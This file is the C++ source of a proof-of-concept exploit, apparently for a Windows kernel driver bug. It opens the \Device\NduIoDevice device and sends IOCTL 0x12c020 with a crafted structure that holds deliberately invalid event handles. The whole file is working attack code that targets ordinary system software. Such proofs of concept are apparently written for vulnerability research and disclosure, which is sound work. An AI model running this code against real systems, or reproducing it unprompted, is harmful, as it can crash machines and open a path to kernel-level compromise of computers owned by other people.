// POC_NDU.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "stdio.h"


#include "Header.h"


struct _BYTECOUNT_LIMIT
{
	ulonglong ValueX;//at 0x0
	ulong ValueY;//at 0x8
	ulong Pad0;//at 0xC
	ulonglong ValueZ;//at 0x10
	HANDLE hEvent;//at 0x18
	HANDLE hEvent2;//at 0x20
};


int OpenDevice(wchar_t* DeviceName,HANDLE* phDevice)
{
	if(!DeviceName) return -1;
	if(!phDevice) return -2;

	*phDevice = INVALID_HANDLE_VALUE;

	HANDLE hFile = 0;
	_UNICODE_STRING Uni  = {0};
	Uni.Buffer = DeviceName; 
	Uni.Length = wcslen(DeviceName) * 2;
	Uni.MaxLength = Uni.Length + 2;


	_OBJECT_ATTRIBUTES Obj = {0};
	Obj.Length = sizeof(Obj);
	Obj.ObjectName = &Uni;
	Obj.Attributes = OBJ_CASE_INSENSITIVE;

	_IO_STATUS_BLOCK IOB = {0};


	int ret = ZwCreateFile(&hFile,
						FILE_GENERIC_READ|FILE_GENERIC_WRITE /*0xC0100080*/,
						&Obj,
						&IOB,
						0 /*AllocationSize*/,
						FILE_ATTRIBUTE_NORMAL /*FileAttributes*/,
						FILE_SHARE_READ|FILE_SHARE_WRITE,
						FILE_OPEN  /*CreateDisposition*/,
						FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_ALERT /*CreateOptions*/,
						0 /*EaBuffer*/,
						0 /*EaLength*/);
	if(hFile && hFile!=INVALID_HANDLE_VALUE)
	{
		*phDevice = hFile;
	}
	return ret;
}


int _tmain(int argc, _TCHAR* argv[])
{
	wchar_t* pDevName = (wchar_t*)LocalAlloc(LMEM_ZEROINIT, (MAX_PATH*2) + 2);
	wcscpy(pDevName,L"\\Device\\NduIoDevice");
	wprintf(L"Opening: %s\r\n",pDevName);

	HANDLE hDev = 0;
	int ret  = OpenDevice(pDevName,&hDev);
	if(	(ret < 0) || (hDev == INVALID_HANDLE_VALUE ) )
	{
		printf("Can't open device, Error: %X\r\n",ret);
		if(ret == 0xC0000022)
		{
			printf("Admin required\r\n");
			return -1;
		}
		return -2;
	}

	_BYTECOUNT_LIMIT LimitX = {0};
	LimitX.hEvent = (HANDLE)0xCCCCCCCCCCCCCCCC;//Invalid Event Handle
	LimitX.hEvent2 = (HANDLE)0xCCCCCCCCCCCCCCCC;//Invalid Event Handle
	LimitX.ValueZ = 1;//Non-Zero

	ulong IoCtl = 0x12c020;
	ulonglong InputLength = sizeof(_BYTECOUNT_LIMIT);

	_IO_STATUS_BLOCK IOSB = {0};
	ulonglong retX = ZwDeviceIoControlFile(hDev,
								0 /* hEvent */,
								0 /* ApcRoutine */,
								0 /* ApcContext */,
								&IOSB,
								IoCtl,
								&LimitX,
								InputLength,
								0,
								0);

	printf("ZwDeviceIoControlFile, ret: %I64X\r\n",retX);

	return 0;
}

